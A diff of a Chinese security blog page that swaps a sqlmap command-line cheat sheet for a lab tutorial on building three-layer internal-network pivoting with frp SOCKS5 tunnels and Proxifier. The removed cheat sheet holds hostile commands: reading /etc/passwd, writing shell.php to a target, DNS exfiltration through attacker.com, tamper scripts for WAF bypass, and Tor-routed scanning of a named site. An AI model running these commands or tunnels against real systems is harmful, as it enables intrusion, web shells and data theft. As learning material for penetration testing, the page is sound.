@@ -4,14 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqlmap命令行参数解析, Lifelong learning">
-    <meta name="description" content="1. 基本参数
-sqlmap --update  更新
-sqlmap -h  查看常用参数
-sqlmap -hh  查看全部参数
-sqlmap --version 查看版本
-sqlmap -v 查看执行过程信息，默认是1，一共0~6
-sql">
+    <meta name="keywords" content="3层内网穿透搭建, Lifelong learning">
+    <meta name="description" content="基于三层内网的网络穿透的搭建首先准备4台靶机, windows2012作为最外面的攻击机，windows2008作为第一层跳板机，
+windows7作为第二层跳板机，最里面的windows7开启web服务。
+打开vmware worksta">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +19,7 @@ sql">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sqlmap命令行参数解析 | Lifelong learning</title>
+    <title>3层内网穿透搭建 | Lifelong learning</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -343,12 +339,12 @@ sql">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqlmap命令行参数解析</h1>
+                    <h1 class="description center-align post-title">3层内网穿透搭建</h1>
                 </div>
             </div>
         </div>
@@ -372,8 +368,8 @@ sql">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/sqlmap%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B1%87%E6%80%BB/">
-                                <span class="chip bg-color">sqlmap命令参数汇总</span>
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F/">
+                                <span class="chip bg-color">网络穿透</span>
                             </a>
                         
                     </div>
@@ -384,8 +380,8 @@ sql">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/sqlmap/" class="post-category">
-                                sqlmap
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" class="post-category">
+                                网络基础
                             </a>
                         
                     </div>
@@ -397,7 +393,7 @@ sql">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-03
+                    2023-02-07
                 </div>
                 
 
@@ -406,7 +402,7 @@ sql">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    547
                 </div>
                 
 
@@ -426,149 +422,91 @@ sql">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>1. 基本参数</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap --update  更新
-sqlmap -h  查看常用参数
-sqlmap -hh  查看全部参数
-sqlmap --version 查看版本
-sqlmap -v 查看执行过程信息，默认是1，一共0~6
-sqlmap -d  “mysql://user:password@192.168.20.10:3386/dvwa" 
-#mysql表示数据库类型， user:password表示目标服务器的账号和密码， 
-@后表示要连接的服务器，3306表示端口，dvwa表示连 接的数据库名称
-sqlmap --wizard # 向导式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h1 id="基于三层内网的网络穿透的搭建"><a href="#基于三层内网的网络穿透的搭建" class="headerlink" title="基于三层内网的网络穿透的搭建"></a>基于三层内网的网络穿透的搭建</h1><p>首先准备4台靶机, windows2012作为最外面的攻击机，windows2008作为第一层跳板机，</p>
+<p>windows7作为第二层跳板机，最里面的windows7开启web服务。</p>
+<pre class="line-numbers language-none"><code class="language-none">打开vmware workstation的虚拟网络编辑器，新增四张网卡，全部选择仅主机模式。
+给它们配置四个不同的网段，配置如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><strong>2. 确定目标</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u  "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" # 指定URL,get请求方式
-sqlmap -m url_list.txt # 使用一个包含多个url的文件进行扫描。若有重复，sqlmap会自动识别成一个。
-sqlmqp -g "inurl:\".php?id=1\"" #扫描，使用Google语法得到的，url
-sqlmap -r  request.txt #Post提交方式，使用BurpSuite的log文件。
-(Options--&gt;Music--&gt;Logging--&gt;Spider--&gt;勾选Request) 5.1 --scopt="(www)?\.target\.(com|net|arg)" # 基于正则表达式去过滤日志内容，筛选需要扫描的对象。
-sqlmap -c  sqlmap.conf # 使用配置文件进行扫描（dpkg -L sqlmap | grep sqlmap.conf)
-sqlmap -u "http://target_url/param1/value1*/param2/value2" # 对于这种写法，加*号扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/vmnet4.jpg"></p>
+<p>网络拓扑图如下：</p>
+<p><img src="/images/networkdj.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">记得配置好网卡，并进行ping测试看看能不能互通，如果不能互通的话，很有可能是主机的防火墙没关
+网卡配置如下：
+windows 2012  VMnet10 VMnet11
+windows 2008  VMnet11 VMnet12
+Windows7    VMnet12  VMnet13
+web windows7 VMnet13
+记得查看每台机器的IP地址是不是在该网段上，如果不在。
+记得看下自己网卡的属性的IPv4是不是设置了自动获得IP地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><strong>3. 配置目标参数</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -p "username, id" # 指定要扫描的参数
-sqlmap --skip="id,user-agent" # 排除指定的扫描参数
-sqlmap --data="user=1&amp;pass=2" # 指定扫描的参数，get/post都适用
-sqlmap --param-del=";" # 改变分隔符，默认是&amp;，因为有些网站不实用&amp;传递多个数据
-sqlmap --cookie="security=low;PHPSESSID=121123131" # 使用cookie的身份认证
---drop-set-cookie # 有时候发起请求后，服务器端会重新Set-cookie给客户端，SQLmap默认会使用新的cookie，这时候可以设置此参数，表示还是用原来的cookie。
---user-aget="aaaaa" # 使用浏览器代理头
---random-agent # 使用随机的浏览器代理头
---host="aaaa" # 使用主机头
---referer="aaaa" # 使用referer头
---headers="host:aaaa\nUser-Agent:bbbb" # 有些网站需要特定的头来身份验证
---method=GET #指定请求方式，还有POST
---auth-type Basic --auth-cred "user:pass" # 身份认证，还有Digest， NTLM
---auth-file="ca.PEM" # 使用私钥证书去进行身份认证，还有个参数--auth-cert，未知用法。
---proxy="http://127.0.0.1:8087/" # 使用代理去扫描目标，代理软件占用的端口在8087
---proxy-cred="name:pass" # 使用代理时的账户和密码
---ignore-proxy # 忽略系统级代理设置，通常用于扫描本地网络目标，本网段。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>现在就让我们来基于网络拓扑图来构建frp穿透吧：</p>
+<p>给每台机器都上传对应的frp穿透工具：</p>
+<pre class="line-numbers language-none"><code class="language-none">windows2012：
+  上传frp服务端和服务端配置文件，配置如下：
+  	[common]
+  	bind_port = 7000
+windows2008:
+	上传frp服务端和客户端和对应的配置文件，配置如下:
+		frps配置:
+			[common]
+			bind_port = 7000
+		frpc配置:
+			[common]
+			server_addr = 172.16.16.128
+			server_port = 7000
+			[socks5]
+			type = tcp
+			local_ip = 127.0.0.1
+			local_port = 9999
+			remote_port = 9000
+windows7:
+	上传frp客户端和对应的配置文件，配置如下:
+		[common]
+		server_addr = 10.0.0.128
+		server_port = 7000
+		[socks5]
+		type = tcp
+		plugin = socks5
+		remote_port = 9999
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><strong>4. 配置目标行为</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">--force-ssl  # 使用HTTPS连接进行扫描
---delay="3" # 每次http请求之间的延迟时间，默认无延迟
---timeout="10" # 请求超时时间，浮点数，默认为30秒
---retries="1" # http连接的重试次数，默认3次
---randomize="id" # 长度，类型与原始值保持一致的情况下，随机参数的取值。比如id=100-&gt; id=1??
---safe-url="" # 检测盲注阶段时，sqlmap会发送大量失败请求，可能导致服务器端销毁session
---safe-freq # 每发送多少次注入请求后，发送一次正常请求，配合--safe-url使用。
---time-sec="3" # 基于时间的注入检测相应延迟时间，默认5秒
---union-cols 6-9 # 默认联合查询1-10列，随--level增加，最多支持100列。
---union-char  123 # 联合查询默认使用null，极端情况下可能失败，此时可以手动执行数值
---technique US # 指定检测注入时所用技术， 默认情况下sqlmap会使用自己支持的全部技术进项检测，有B, E, U, S, T, Q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>现在开始开启frp穿透：</p>
+<pre class="line-numbers language-none"><code class="language-none">windows2012开启frps：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>5. 优化探测过程</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">--level 1 默认配置
-level 2 检测cookie中是否含有注入
-level3 检测user-agent、referer是否含有注入
-level5 检测host是否含有注入
---risk 默认1，最高4，等级高容易造成数据被纂改风险
---predict-output  # 优惠检测方法，不断比对大数据，缩小检测范围，提高效率，与--threads参数不兼容
---keep-alive # 长连接、性能好，避免重复建立的网络开销，但大量连接会占用服务器资源。与--proxy参数不兼容
---null-connection # 只获取页面大小的值，通常用于盲注判断真假，与--text-only不兼容
--o #直接开启以上三个
---threads=7 # 提高并发线程，默认为1，建议不要超过10，否则影响站点可用性，与--predict-out 不兼容
---string="woaini" # 页面比较，用于基于布尔注入的检测，因为有时候页面随时间阈值变化，此时需要人为指定标识真假的字符串
---not-string="woaini"
---regexp
---code=200
---text-only
---titles="Welcome"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/windows2012frps.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">windows2008分别开启frps和frpc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>6. 特定目标环境</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">--skip-urlencode # 默认get传参会使用URL编码，但有些服务器没按规范，使用原始字符提交数据。
---eval="import hashlib;hash=hashlib.md5(id).hexdigest()" # 在提交前，对参数进行python的处理，提升效率
---dbms="Mysql" # 指定数据库类型，还可以加上版本 Mysql
---os="Windows" # 指定操作系统，还可以是Linux
---invalid-bignum # sqlmap默认使用负值让参数进行失效，该参数使用最大值让参数失效，比如id=9999999
---invalid-logical # 使用布尔值，比如id 13 and 18=19
---no-cast # 将sqlmap取出的数据转换为字符串，并用空格替换NULL结果，在老版本时需要开启此开关。
---no-escape # 为了逃逸服务器端对sqlmap的检测，默认使用char()编码替换字符串。本参数将关闭此功能。比如select 'foo'--&gt;select char(102) +char(111) +char(111)
---prefix ''')''' # 添加前缀 【')
---suffix "AND('abc'='abc" #添加后缀 【AND('abc'='abc
---tamper="tamper/between.py, tamper/randomcase.py" # 使用脚本，绕过IPS, WAF等
---dns-domain attacker.com # 攻击者控制了DNS服务器，可以提高取出数据的效率
---second-order http://1.1.1.1/b.php # 在一个页面注入的结果，从另一个页面体现出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/windows2008frps_frpc.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">windows7开启frpc:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>7. 查看基本信息</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">-f # 扫描时加入数据库指纹检测
--b # 查看数据库的版本信息
---user # 查询所有的数据库账号
---dbs  # 查询所有数据库
---schema # 查询源数据库 (包含定义数据的数据)
--a  # 查询当前user、当前数据库、主机名、当前user是否是最大权限管理员、数据库账号等
--D dvwa # 指定数据库
---current-user # 查询当前数据库用户
---hostname # 查看服务器的主机名
---Privileges -U username # 查询username的权限
---roles 角色
---tables # 查看所有的表
--T # 指定表
---columns # 查看所有的字段
--C # 指定字段
---count # 计数，查看有多少条数据
---exclude-sysdbs # 排除系统库
---dump # 查看数据
---start 3 # 查看第三条
---end 4 # 查看第四条
---sql-query "select * from users" # 执行语句
---common-columns # 暴力破解表
---common-tables # 暴力破解表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/windows7frpc.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">最后在web windows上开启web服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>8. 其他参数</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">--batch # 自动选是
--s: sqllite会话文件保存位置
--t:  记录流量文件保存位置
---charset=GBK: 强制字符编码
---crawl=3 ： 爬站深度
---csv-del=";" # 指定csv文件的分隔符
---dbms-cred # 指定数据库账号
---flush-session # 清空session
---force-ssl # 强制使用HTTPS
---fresh-queries # 重新检测，不使用本地已查询的数据
---hex # 以16进制的形式编码dump出来的数据
---output-dir # 输出目录
---parse-errors # 分析和显示数据库内建报错信息
---save ： 将命令保存成配置文件
--z 参数助记符
---answer="extending=N" # 回答
---check-waf # 检测WAF/IPS/IDS
---hpp # 绕过WAF/IPS/IDS
---identify-waf # 彻底检测WAF/IPS/IDS
---mobile # 模拟智能手机设备
---purge-output # 清楚output文件夹
---smart # 当有大量检测目标时，只选择基于错误的检测结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/web_windows7.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">成功后，用我们的windows2012攻击机访问web windows7的web服务，
 
-<p><strong>9. 高级注入参数</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">--udf-inject,--shared-lib # 编译共享库创建并且上传至DB Server，依次生成UDF实现高级注入
---file-read="/etc/passwd" # 文件系统访问
---file-write="shell.php" --file-dest"/tmp/shell.php" #写文件到目标位置
---sql-shell # 进入交互式mysql窗口
-操作系统访问
-注册表访问sqlmap.py -u http://navisec.it/123.asp?id=1 --tor -tor-type=SOCKS5 --torport=9050 --check-to<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+看看我们的frp服务有没有搭建成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="注：具体sqlmap使用请查看如下网址：https-www-freebuf-com-sectool-245314-html"><a href="#注：具体sqlmap使用请查看如下网址：https-www-freebuf-com-sectool-245314-html" class="headerlink" title="注：具体sqlmap使用请查看如下网址：https://www.freebuf.com/sectool/245314.html"></a>注：具体sqlmap使用请查看如下网址：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/245314.html">https://www.freebuf.com/sectool/245314.html</a></h3>
+<p><img src="/images/web_windows7_failed.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">如图所示：很遗憾，并没有成功。
+
+在我不假思索之际，得亏坤哥大师傅的指点。
+
+原来我们只是把windows7的9000端口转发出来了，而我们的流量没有经过9000端口。
+
+所以得用Proxifier把全局流量代理到9000端口。配置如下：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/proxifier_ip.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">先配置代理的端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/proxifier_rules.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">配置代理规则<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/web_success.jpg"></p>
+<pre class="line-numbers language-none"><code class="language-none">可以看到，访问成功，至此实现了frp三层代理
+最后只能说一句：坤哥yyds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
                 
             </div>
             <hr/>
@@ -594,7 +532,7 @@ level5 检测host是否含有注入
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://hwying1.github.io/2023/02/03/sqlmap-ming-ling-xing-can-shu-jie-xi/">http://hwying1.github.io/2023/02/03/sqlmap-ming-ling-xing-can-shu-jie-xi/</a>
+                    <a href="http://hwying1.github.io/2023/02/07/3-ceng-nei-wang-chuan-tou-da-jian/">http://hwying1.github.io/2023/02/07/3-ceng-nei-wang-chuan-tou-da-jian/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -632,8 +570,8 @@ level5 检测host是否含有注入
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/sqlmap%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B1%87%E6%80%BB/">
-                                    <span class="chip bg-color">sqlmap命令参数汇总</span>
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F/">
+                                    <span class="chip bg-color">网络穿透</span>
                                 </a>
                             
                         </div>
@@ -712,17 +650,18 @@ level5 检测host是否含有注入
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/02/03/sql-xue-xi-bi-ji/">
+                <a href="/2023/02/07/3-ceng-nei-wang-chuan-tou-da-jian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="sql学习笔记">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="3层内网穿透搭建">
                         
-                        <span class="card-title">sql学习笔记</span>
+                        <span class="card-title">3层内网穿透搭建</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -732,30 +671,27 @@ level5 检测host是否含有注入
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-07
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
-                                    学习笔记总结
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" class="post-category">
+                                    网络基础
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
-                        <span class="chip bg-color">漏洞原理分析</span>
-                    </a>
-                    
-                    <a href="/tags/sql%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">sql学习</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F/">
+                        <span class="chip bg-color">网络穿透</span>
                     </a>
                     
                 </div>
@@ -769,13 +705,13 @@ level5 检测host是否含有注入
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/02/03/ssrf-xue-xi-bi-ji/">
+                <a href="/2023/02/04/weblogic-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="ssrf学习笔记">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="weblogic复现">
                         
-                        <span class="card-title">ssrf学习笔记</span>
+                        <span class="card-title">weblogic复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -786,14 +722,14 @@ level5 检测host是否含有注入
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-04
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
-                                    学习笔记总结
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -803,12 +739,12 @@ level5 检测host是否含有注入
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
-                        <span class="chip bg-color">漏洞原理分析</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/ssrf%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">ssrf学习</span>
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                 </div>
